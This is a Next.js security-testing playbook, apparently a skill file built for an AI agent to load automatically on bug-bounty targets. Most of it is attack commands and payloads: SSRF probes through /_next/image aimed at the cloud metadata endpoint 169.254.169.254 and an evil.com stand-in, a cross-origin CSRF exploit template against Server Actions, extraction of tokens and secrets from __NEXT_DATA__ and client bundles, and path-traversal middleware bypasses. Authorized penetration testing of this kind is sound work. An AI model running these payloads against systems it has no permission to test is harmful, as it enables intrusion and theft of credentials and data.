---
name: nextjs-security
description: "Next.js security testing playbook for bug bounty targets. Covers: App Router attack surface, Server Actions CSRF, /_next/image SSRF, source map extraction, next.config.js checklist, __NEXT_DATA__ enumeration, middleware bypass. Load when: Next.js detected in tech fingerprint (x-powered-by: Next.js, _next/static, __NEXT_DATA__ script tag)."
version: 1.0
created: 2026-04-11
owner: cyber-operator
trigger_keywords: "nextjs, next.js, next js, server actions, app router, _next/static, _next/image, __NEXT_DATA__, vercel, next config, next.config.js, rsc, react server component"
---

# Next.js Security Testing Playbook

## Fingerprinting Next.js Targets

```bash
# HTTP response headers
curl -sI https://target.com | grep -i "x-powered-by\|server\|next"
# → x-powered-by: Next.js

# HTML source
curl -s https://target.com | grep -i "_next\|__NEXT_DATA__\|buildId"
# → <script id="__NEXT_DATA__" type="application/json">{"buildId":"..."}

# Static assets path
/_next/static/chunks/
/_next/static/css/
# → Confirms Next.js

# Build ID extraction from __NEXT_DATA__
curl -s https://target.com | python3 -c "
import sys,json,re
html = sys.stdin.read()
m = re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.+?)</script>', html)
if m:
    data = json.loads(m.group(1))
    print('Build ID:', data.get('buildId'))
    print('Page props:', list(data.get('props', {}).keys()))
    print('Server data:', str(data)[:500])
"
```

---

## Vector 1 — `/_next/image` SSRF

**Description:** The image optimization API proxies external images if `remotePatterns` is misconfigured with `hostname: '*'` (wildcard). This is an SSRF vector.

**Test:**
```bash
# Check if image endpoint accepts arbitrary external URLs
curl -v "https://target.com/_next/image?url=http://169.254.169.254/latest/meta-data/&w=100&q=75"
# Or with Interactsh:
curl -v "https://target.com/_next/image?url=http://your-interactsh-fqdn/nextjs-img-ssrf&w=100&q=75"

# Variations to try:
/_next/image?url=https://evil.com/image.jpg&w=100&q=75  # External image
/_next/image?url=http://localhost:8080/admin&w=100&q=75 # Internal service
/_next/image?url=http://[::1]/&w=100&q=75              # IPv6 localhost
```

**Vulnerable configuration in `next.config.js`:**
```javascript
images: {
  remotePatterns: [
    { hostname: '*' }  // VULNERABLE — allows ANY hostname
  ]
}
```

**CVSS 4.0:** If IMDS accessible via image proxy: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H = 9.3 Critical`

---

## Vector 2 — Server Actions CSRF (Pre-v14.1)

**Description:** Before Next.js 14.1, Server Actions lacked Origin validation, enabling CSRF from any domain.

**Identify Server Actions:**
```bash
# Look for unique action IDs in page source
curl -s https://target.com/form-page | grep -o '"[a-f0-9]\{40\}"'
# Server actions have a unique hash as their action ID

# Or look for Next-Action header in requests
# POST requests with: Next-Action: {action_hash}
```

**CSRF exploit template:**
```html
<!-- cross-origin CSRF for Server Action on pre-14.1 Next.js -->
<form action="https://target.com/[PAGE]" method="post" enctype="multipart/form-data">
  <input type="hidden" name="1_$ACTION_ID_[HASH]" value="[ACTION_PAYLOAD]">
  <button type="submit">Click me</button>
</form>

<!-- Or via fetch: -->
<script>
fetch('https://target.com/[PAGE]', {
  method: 'POST',
  headers: {'Next-Action': '[HASH]'},
  body: JSON.stringify(payload)
});
</script>
```

**Check version:** Look for `"next":` in `/_next/static/chunks/` bundle or `package.json` if exposed.

---

## Vector 3 — `__NEXT_DATA__` Enumeration

**Description:** Next.js embeds initial server-side data in `<script id="__NEXT_DATA__">` for hydration. This often contains sensitive information.

```bash
# Extract and pretty-print __NEXT_DATA__ from any page
curl -s https://target.com/any-page | python3 -c "
import sys,json,re
html = sys.stdin.read()
match = re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.+?)</script>', html, re.DOTALL)
if match:
    data = json.loads(match.group(1))
    print(json.dumps(data, indent=2))
"
```

**Look for in output:**
- `props.pageProps` → server-side fetched data (user data, API responses)
- `props.pageProps.user` → authenticated user object
- Internal API URLs (`/api/internal/*`)
- Auth tokens, session IDs
- Environment variable leakage

**High-value pages to check:** `/dashboard`, `/settings`, `/admin`, `/profile`, `/checkout`

---

## Vector 4 — Source Map Extraction

**Description:** Development builds expose `.js.map` files containing original TypeScript source code.

```bash
# From a .js bundle URL like: /_next/static/chunks/pages/index-abc123.js
# Try appending .map:
/_next/static/chunks/pages/index-abc123.js.map

# Enumerate main bundles:
/_next/static/chunks/main-abc123.js.map
/_next/static/chunks/webpack-abc123.js.map
/_next/static/chunks/framework-abc123.js.map

# Check if source map is referenced in .js file:
curl -s https://target.com/_next/static/chunks/pages/index-abc123.js | tail -1
# → //# sourceMappingURL=index-abc123.js.map (confirms map exists)
```

**→ See `a source-map recon step` for full source map analysis workflow.**

---

## Vector 5 — App Router Parallel Routes Bypass

**Description:** Next.js App Router parallel routes (`@folder`) can expose data on paths not intended for direct access.

```
Parallel route structure:
  app/
    @sidebar/
      page.tsx    ← Accessible at /@sidebar/
    @main/
      private/
        page.tsx  ← May be accessible at /@main/private/
```

**Test:**
```bash
# If app uses parallel routes (look for @ imports in bundle source):
curl https://target.com/@main/private/
curl https://target.com/@sidebar/admin/
# May return data from parallel route segments without main route auth checks
```

---

## Vector 6 — `next.config.js` Misconfiguration Checklist

```javascript
// HIGH RISK:
module.exports = {
  images: {
    remotePatterns: [{ hostname: '*' }]  // → SSRF vector (see Vector 1)
  },
  
  async headers() {
    return []  // No security headers → missing CSP, X-Frame-Options
  },
  
  async rewrites() {
    return [{ source: '/:path*', destination: 'http://internal-service/:path*' }]
    // Rewrites to internal services → SSRF via rewrite rule
  },
  
  // MEDIUM RISK:
  dangerouslyAllowSVG: true,  // SVG images may contain XSS
  contentDispositionType: 'inline',  // Forces inline display (XSS chain)
  
  // CHECK FOR:
  env: {
    SECRET_API_KEY: process.env.SECRET_API_KEY  // Env vars in next.config.js
    // are bundled into client code if not prefixed with NEXT_PUBLIC_!
    // Non-NEXT_PUBLIC_ vars should NOT appear in bundles
  }
}
```

**Check client bundle for leaked env vars:**
```bash
curl -s "https://target.com/_next/static/chunks/main-abc123.js" | grep -o '"[A-Z_]*":process\.env\.[A-Z_]*'
# → Any non-NEXT_PUBLIC_ var = server secret exposed to client
```

---

## Vector 7 — Middleware Bypass

**Description:** Next.js middleware runs on the edge before routes. Misconfigured matchers can be bypassed.

**Common middleware patterns:**
```typescript
// Vulnerable: auth check on /dashboard but not /dashboard/api
export const config = {
  matcher: ['/dashboard']  // Only matches exact path, not sub-paths
}
// Test: /dashboard/api/private → may bypass middleware auth

// Vulnerable: exclusion too broad
matcher: ['/((?!api|_next|favicon).*)']  // Excludes /api routes
// Test: /api/admin → if admin routes exist under /api, unprotected
```

**Test:**
```bash
# If /dashboard requires login, test variations:
/dashboard/../api/admin  # Path traversal
/dashboard//             # Double slash
/dashboard?              # Query string at path boundary
/DASHBOARD               # Case variation
```

---

## Nuclei Quick Scan

```bash
# Run Next.js specific templates:
nuclei -u https://target.com -tags nextjs,react -rate-limit 10

# Custom: check /_next/image SSRF
nuclei -t custom/nextjs-image-ssrf.yaml -u https://target.com
```

---

*Next.js Security v1.0 | Framework-Specific Bounty Track | Whitehat System*
